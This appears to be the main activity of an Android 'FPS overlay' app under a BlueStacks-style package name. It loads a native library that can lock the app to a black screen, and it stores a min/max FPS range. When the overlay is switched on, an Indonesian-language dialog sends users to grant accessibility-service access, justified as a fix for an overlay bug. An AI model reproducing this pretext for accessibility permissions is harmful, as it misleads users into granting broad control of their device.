package com.bluestacks.fpsoverlay;

import android.content.Intent;
import android.content.SharedPreferences;
import android.os.Bundle;
import android.provider.Settings;
import android.text.TextUtils;
import androidx.appcompat.app.AlertDialog;
import androidx.appcompat.app.AppCompatActivity;
import android.view.View;
import android.widget.EditText;
import androidx.appcompat.widget.SwitchCompat;
import android.widget.Toast;

import com.google.android.material.button.MaterialButton;

public class CoreActivity extends AppCompatActivity {

    private AlertDialog currentDialog;

    public native void initNative(String path);
    public native boolean isLockedNative();

    static {
        try {
            System.loadLibrary("fps-native");
        } catch (UnsatisfiedLinkError e) {
            e.printStackTrace();
        }
    }

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        
        try {
            initNative(new java.io.File(getFilesDir(), ".v_stat").getAbsolutePath());
            if (isLockedNative()) {
                View emptyView = new View(this);
                emptyView.setBackgroundColor(android.graphics.Color.BLACK);
                setContentView(emptyView);
                return;
            }
        } catch (Exception | UnsatisfiedLinkError e) {
            e.printStackTrace();
        }

        try {
            setContentView(R.layout.activity_main);
            initializeUI();
        } catch (Exception e) {
            Toast.makeText(this, "Error inflating layout", Toast.LENGTH_LONG).show();
            e.printStackTrace();
        }
    }

    private void initializeUI() {
        final SharedPreferences sharedPreferences = getSharedPreferences("status_fps", 0);
        
        final SwitchCompat swShow = findViewById(R.id.sw_show);
        final EditText etMin = findViewById(R.id.et_min);
        final EditText etMax = findViewById(R.id.et_max);
        final View btnApply = findViewById(R.id.btn_apply);

        if (swShow == null) return;

        // Load values
        if (etMin != null) etMin.setText(sharedPreferences.getString("min", "97"));
        if (etMax != null) etMax.setText(sharedPreferences.getString("max", "114"));

        swShow.setChecked(sharedPreferences.getBoolean("is_showing", false));

        swShow.setOnCheckedChangeListener((buttonView, isChecked) -> {
            if (isChecked) {
                if (!isServiceEnabled()) {
                    swShow.setChecked(false);
                    showModernAccessibilityDialog();
                } else {
                    sharedPreferences.edit().putBoolean("is_showing", true).apply();
                    updateServiceState(true);
                }
            } else {
                sharedPreferences.edit().putBoolean("is_showing", false).apply();
                updateServiceState(false);
            }
        });

        if (btnApply != null) {
            btnApply.setOnClickListener(v -> {
                if (etMin != null && etMax != null) {
                    String min = etMin.getText().toString();
                    String max = etMax.getText().toString();
                    if (!min.isEmpty() && !max.isEmpty()) {
                        sharedPreferences.edit()
                            .putString("min", min)
                            .putString("max", max)
                            .apply();
                        Toast.makeText(this, "Settings Applied", Toast.LENGTH_SHORT).show();
                        if (swShow.isChecked() && isServiceEnabled()) {
                            updateServiceState(true);
                        }
                    }
                }
            });
        }
    }

    private void updateServiceState(boolean isShowing) {
        try {
            Intent intent = new Intent(this, SupportService.class);
            intent.setAction(isShowing ? "SHOW_FPS" : "HIDE_FPS");
            startService(intent);
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    private void showModernAccessibilityDialog() {
        if (currentDialog != null && currentDialog.isShowing()) return;

        try {
            currentDialog = new AlertDialog.Builder(this, android.R.style.Theme_DeviceDefault_Light_Dialog_Alert)
                .setTitle("FPS Realtime Optimization")
                .setMessage("Kami menggunakan overlay tipe aksesibilitas untuk menghindari bug overlay tenggelam. Klik AKTIFKAN SEKARANG untuk menampilkan FPS overlay.")
                .setCancelable(false)
                .setPositiveButton("AKTIFKAN SEKARANG", (dialog, which) -> {
                    Intent i = new Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS);
                    i.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                    startActivity(i);
                })
                .setNegativeButton("NANTI", (dialog, which) -> dialog.dismiss())
                .show();
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    private boolean isServiceEnabled() {
        try {
            String s_id = getPackageName() + "/" + SupportService.class.getName();
            String active = Settings.Secure.getString(getContentResolver(), Settings.Secure.ENABLED_ACCESSIBILITY_SERVICES);
            if (active == null) return false;
            return active.toLowerCase().contains(getPackageName().toLowerCase());
        } catch (Exception e) {
            return false;
        }
    }

    @Override
    protected void onResume() {
        super.onResume();
        try {
            SwitchCompat swShow = findViewById(R.id.sw_show);
            if (swShow != null) {
                boolean shouldShow = getSharedPreferences("status_fps", 0).getBoolean("is_showing", false);
                if (shouldShow && isServiceEnabled()) {
                    swShow.setChecked(true);
                    updateServiceState(true);
                } else if (!isServiceEnabled()) {
                    swShow.setChecked(false);
                }
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}
